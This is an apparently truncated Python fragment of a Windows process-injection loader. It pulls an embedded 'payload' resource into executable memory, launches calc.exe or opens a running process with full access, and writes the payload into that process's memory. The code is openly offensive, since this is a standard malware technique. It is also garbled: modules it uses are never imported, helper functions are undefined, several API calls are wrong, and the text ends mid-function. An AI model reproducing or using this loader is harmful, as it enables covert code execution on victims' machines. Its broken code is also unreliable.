import win32process

MY_RESOURCE = 101

def get_raw_payload():
    hInstance = ctypes.windll.kernel32.GetModuleHandleW(None)
    res = ctypes.windll.kernel32.FindResourceW(hInstance, MY_RESOURCE, win32con.RT_RCDATA)
    if not res:
        return None, 0

    res_handle = ctypes.windll.kernel32.LoadResource(None, res)
    if not res_handle:
        return None, 0

    res_data = ctypes.windll.kernel32.LockResource(res_handle)
    res_size = ctypes.windll.kernel32.SizeofResource(None, res)

    out_buf = ctypes.windll.kernel32.VirtualAlloc(None, res_size, win32con.MEM_COMMIT | win32con.MEM_RESERVE, win32con.PAGE_EXECUTE_READWRITE)
    ctypes.memmove(out_buf, res_data, res_size)

    ctypes.windll.kernel32.FreeResource(res_handle)
    return out_buf, res_size

def make_new_process():
    targetPath = ctypes.create_unicode_buffer(260)
    if not get_calc_path(targetPath, 260):
        return None

    startupinfo = win32process.STARTUPINFO()
    process_information = win32process.PROCESS_INFORMATION()
    if not win32process.CreateProcess(targetPath, None, None, None, False, 0, None, None, ctypes.byref(startupinfo), ctypes.byref(process_information)):
        return None
    print("PID:", process_information.dwProcessId)

    return process_information.hProcess, process_information.hThread

def is_compiled_32b():
    return sys.maxsize <= 2**32

def find_running_process(process_name):
    for pid in get_pids(process_name):
        hProcess = ctypes.windll.kernel32.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, pid)
        if hProcess:
            return hProcess
    return None

def get_pids(process_name):
    pids = []
    for pid in subprocess.get_pids():
        try:
            proc_name = os.path.basename(win32process.GetModuleFileNameEx(win32con.PROCESS_QUERY_INFORMATION, pid))
            if proc_name.lower() == process_name.lower():
                pids.append(pid)
        except Exception as e:
            pass
    return pids

def inject_PE32(hProcess, res_data, res_size):
    return ctypes.windll.kernel32.WriteProcessMemory(hProcess, None, res_data, res_size, None)

def main():
    res_data, res_size = get_raw_payload()

    if not res_data:
        print("Failed!")
        return -1

    if not is_compiled_32b():
